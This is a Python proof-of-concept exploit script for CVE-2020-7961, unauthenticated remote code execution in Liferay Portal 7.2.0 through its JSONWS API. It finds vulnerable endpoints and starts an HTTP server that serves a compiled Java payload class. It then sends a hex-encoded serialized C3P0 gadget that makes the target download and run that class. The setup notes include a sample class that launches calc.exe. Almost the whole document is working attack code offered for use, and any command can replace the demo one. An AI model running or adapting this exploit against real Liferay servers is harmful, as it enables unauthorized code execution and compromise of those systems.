'''
	Title: POC for Unauthenticated Remote code execution via JSONWS (LPS-97029/CVE-2020-7961) in Liferay 7.2.0 CE GA1 
	POC author: mzero
	Download link: https://sourceforge.net/projects/lportal/files/Liferay%20Portal/7.2.0%20GA1/liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.7z/download
	Based on https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html research
	Usage: python poc.py -h
	
	Gadget used: C3P0WrapperConnPool 
	
	Installation:
	pip install requests
	pip install bs4
	
	Create file LifExp.java with example content:
	public class LifExp {
		static {
		try {
			String[] cmd = {"cmd.exe", "/c", "calc.exe"};
			java.lang.Runtime.getRuntime().exec(cmd).waitFor();
		} catch ( Exception e ) {
			e.printStackTrace();
			}
		}
	}

	javac LifExp.java
	Place poc.py and LifExp.class in the same directory.
'''
import requests
import threading
import time
import sys
import argparse
from bs4 import BeautifulSoup
from datetime import datetime
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# SET proxy
PROXIES = {}
#PROXIES = {"http":"http://127.0.0.1:9090"}
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class HttpHandler(BaseHTTPRequestHandler):
	
	def do_GET(self):
		self.send_response(200)
		self.send_header('Content-type','application/java-vm')
		self.end_headers()
		f = open("LifExp.class", "rb")
		self.wfile.write(f.read())
		f.close()
		return

def log(level, msg):
	prefix = "[#] "
	if level == "error":
		prefix = "[!] "
	d = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
	temp = "{} [{}] {}".format(prefix, d, msg)
	print(temp)

def find_href(body):
	soup = BeautifulSoup(body, "html.parser")
	return soup.find_all('a', href=True)

def find_class(body, clazz):
	soup = BeautifulSoup(body, "html.parser")
	return soup.findAll("div", {"class": clazz})

def find_id(body):
	soup = BeautifulSoup(body, "html.parser")
	return soup.findAll("form", {"id": "execute"})

def get_param(div):
	param = ""
	param_type = ""
	p_name = div.find("span", {"class": "lfr-api-param-name"})
	p_type = div.find("span", {"class": "lfr-api-param-type"})
	if p_name:
		param = p_name.text.strip()
	if p_type:
		param_type = p_type.text.strip()
		
	return (param, param_type)

def _do_get(url):
	resp = requests.get(url, proxies=PROXIES, verify=False)
	return resp
	
def do_get(host, path):
	url = "{}/{}".format(host, path)
	resp = _do_get(url)
	return resp
	
def _do_post(url, data):
	resp = requests.post(url, proxies=PROXIES, verify=False,  data=data)
	print("URL is: "+ url + "\n\nPAYLOAD" + str(data))
	return resp
	
def do_post(host, path, data):
	url = "{}/{}".format(host, path)
#	print(url + '\n\n' + str(data))
	resp = _do_post(url, data)
	return resp
	
def find_endpoints(host, path):
	result = []
	resp = do_get(host, path)
	links = find_href(resp.text)
	#a = links[337].get('data-metadata')	
	#print(a)
#	for i in range(0, len(links)):
	for link in links:
	#	if "java.lang.Object" in links[i].get('data-metadata'):
		if (link.get('data-metadata')=="ExpandoColumnServiceImpl"):
			result.append(link['href'])
       #         if "ExpandoColumnServiceImpl" in link.get('data-metadata'):
	#		print(link["href"])
	#		result.append(link['href'])
	return result

def find_parameters(body):
	div_params = find_class(body, "lfr-api-param")
	params = []
	for d in div_params:
		params.append(get_param(d))
	return params

def find_url(body):
	form = find_id(body)[0]
	return form['action']

def set_params(params, payload, payload_type):
	result = {}
	for param in params:
		p_name, p_type = param
		if p_type == "java.lang.Object":
			result[p_name+":"+payload_type] = payload
		result[p_name] = "1"
	return result

def pad(data, length):
	return data+"\x20"*(length-len(data))
	
def exploit(host, api_url, params, PAYLOAD, PAYLOAD_TYPE):
	p = set_params(params, PAYLOAD, PAYLOAD_TYPE)
	resp = do_post(host, api_url, p)

banner = """POC author: mzero\r\nBased on https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html research"""

def main():
	print(banner)
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", "--target-host", dest="target", help="target host:port", required=True)
	parser.add_argument("-u", "--api-url", dest="api_url", help="path to jsonws. Default: /api/jsonws", default="/api/jsonws")
	parser.add_argument("-p", "--bind-port", dest="bind_port", help="HTTP server bind port. Default 9091", default=9091)
	parser.add_argument("-l", "--bind-ip", dest="bind_ip", help="HTTP server bind IP. Default 127.0.0.1. It can't be 0.0.0.0", default="127.0.0.1")

	args = parser.parse_args()
	bind_port  = int(args.bind_port)
	bind_ip = args.bind_ip
	target_ip = args.target
	api_url = args.api_url
	endpoints = []
	vuln_endpoints = []
	
	PAYLOAD_TYPE = "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
	PAYLOAD_PREFIX = """{"userOverridesAsString":"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c69664578707400c8"""
	PAYLOAD_SUFIX = """740003466f6f;"}"""
	PAYLOAD = PAYLOAD_PREFIX +pad("http://{}:{}/".format(bind_ip, bind_port), 200).encode("hex")+PAYLOAD_SUFIX
	print(pad("http://{}:{}/".format(bind_ip, bind_port),200).encode("hex"))
	try:
		log("info", "Looking for vulnerable endpoints: {}/{}".format(target_ip, api_url))
		endpoints = find_endpoints(target_ip, api_url)
		# print(endpoints)
		if not endpoints:
			log("info", "Vulnerable endpoints not found!")
			sys.exit(1)
	except Exception as ex:
		log("error", "An error occured:")
		print(ex)
		sys.exit(1)
	try:
		server = HTTPServer((bind_ip, bind_port), HttpHandler)
		log("info", "Started HTTP server on {}:{}".format(bind_ip, bind_port))
		th = threading.Thread(target=server.serve_forever)
		th.daemon=True
		th.start()
		
		for e in endpoints:
			resp = do_get(target_ip, e)
			params = find_parameters(resp.text)
			url_temp = find_url(resp.text)
			vuln_endpoints.append((url_temp, params))
		
		for endpoint in vuln_endpoints:
			log("info", "Probably vulnerable endpoint {}.".format(endpoint[0]))
			op = raw_input("Do you want to test it? Y/N: ")
			if op.lower() == "y":
				exploit(target_ip, endpoint[0], endpoint[1], PAYLOAD, PAYLOAD_TYPE)
				#print(a)
		log("info", "CTRL+C to exit :)")
		while True:
			time.sleep(1)
	except KeyboardInterrupt:
		log("info", "Shutting down...")
		server.socket.close()
	except Exception as ex:
		log("error", "An error occured:")
		print(ex)
		sys.exit(1)
	
if __name__ == "__main__":
	main()
